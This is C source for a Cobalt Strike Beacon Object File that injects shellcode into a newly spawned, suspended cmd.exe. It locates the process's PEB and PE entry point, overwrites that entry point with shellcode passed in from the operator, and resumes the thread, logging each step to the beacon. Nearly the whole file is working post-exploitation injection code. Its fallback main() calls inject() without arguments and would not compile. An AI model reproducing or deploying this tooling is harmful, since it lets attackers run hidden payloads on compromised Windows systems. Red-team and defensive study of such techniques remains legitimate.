#include <windows.h>
#include "bofdefs.h"
#include "base.c"
#include <tchar.h>
#include <stdio.h>

void inject(const CHAR* shellcode, SIZE_T shellcodeSize) {
    BeaconPrintf(CALLBACK_OUTPUT, "shellcode[0..3]: %02x %02x %02x %02x\n",
        (unsigned char)shellcode[0], (unsigned char)shellcode[1],
        (unsigned char)shellcode[2], (unsigned char)shellcode[3]);

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    KERNEL32$CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,L"C:\\Windows\\System32",&si,&pi);
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    BeaconPrintf(CALLBACK_OUTPUT, "hProcess: %p\n", hProcess);
    BeaconPrintf(CALLBACK_OUTPUT, "hThread: %p\n", hThread);

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;

    // get the process basic information to find the PEB later
    NTSTATUS status = NTDLL$NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);

    BeaconPrintf(CALLBACK_OUTPUT, "pbi.PebBaseAddress: %p\n", pbi.PebBaseAddress);

    // image base address is at PEB + 0x10  (x64)
    LPVOID lpBaseAddress = (LPVOID)((ULONG_PTR)(pbi.PebBaseAddress) + 0x10);

    BeaconPrintf(CALLBACK_OUTPUT, "lpBaseAddress: %p\n", lpBaseAddress);

    // read base address
    LPVOID baseAddress = NULL;
    SIZE_T bytesRead = 0;
    BOOL readProcessMemoryRes = KERNEL32$ReadProcessMemory(hProcess, lpBaseAddress, &baseAddress, 8, &bytesRead);

    BeaconPrintf(CALLBACK_OUTPUT, "baseAddress: %p\n", baseAddress);

    //read DOS header
    IMAGE_DOS_HEADER dosHeader = { 0 };
    BOOL readDosHeaderRes = KERNEL32$ReadProcessMemory(hProcess, baseAddress, &dosHeader, sizeof(dosHeader), &bytesRead);

    BeaconPrintf(CALLBACK_OUTPUT, "dosHeader.e_lfanew: %d\n", dosHeader.e_lfanew);

    // use e_lfanew to find the NT header
    LPVOID ntHeaderAddress = (LPVOID)((ULONG_PTR)(baseAddress) + dosHeader.e_lfanew);

    BeaconPrintf(CALLBACK_OUTPUT, "ntHeaderAddress: %p\n", ntHeaderAddress);

    //read NT header
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    BOOL readNtHeadersRes = KERNEL32$ReadProcessMemory(hProcess, ntHeaderAddress, &ntHeaders, sizeof(ntHeaders), &bytesRead);

    BeaconPrintf(CALLBACK_OUTPUT, "ntHeaders.OptionalHeader.AddressOfEntryPoint: %d\n", ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // calc entrypoint address
    LPVOID entrypointAddress = (LPVOID)((ULONG_PTR)(baseAddress) + ntHeaders.OptionalHeader.AddressOfEntryPoint);

    BeaconPrintf(CALLBACK_OUTPUT, "entrypointAddress: %p\n", entrypointAddress);

    // write shellcode to entrypoint address, overwrite PE
    SIZE_T bytesWritten = 0;
    BOOL writeProcessMemoryRes = KERNEL32$WriteProcessMemory(hProcess, entrypointAddress, shellcode, shellcodeSize, &bytesWritten);

    BeaconPrintf(CALLBACK_OUTPUT, "bytesWritten: %d\n", bytesWritten);
    BeaconPrintf(CALLBACK_OUTPUT, "writeProcessMemoryRes: %d\n", writeProcessMemoryRes);
    // resume thread
    BOOL resumeThreadRes = KERNEL32$ResumeThread(hThread);

    BeaconPrintf(CALLBACK_OUTPUT, "resumeThreadRes: %d\n", resumeThreadRes);
    return;
}

#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{


    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    int shellcodeSizeInt = 0;
    CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSizeInt);
    SIZE_T shellcodeSize = (SIZE_T)shellcodeSizeInt;

    if (!bofstart())
    {
        return;
    }

    inject(shellcode, shellcodeSize);

    printoutput(TRUE);
    bofstop();
};
#else
int main()
{
    inject();
    return 1;
}
#endif
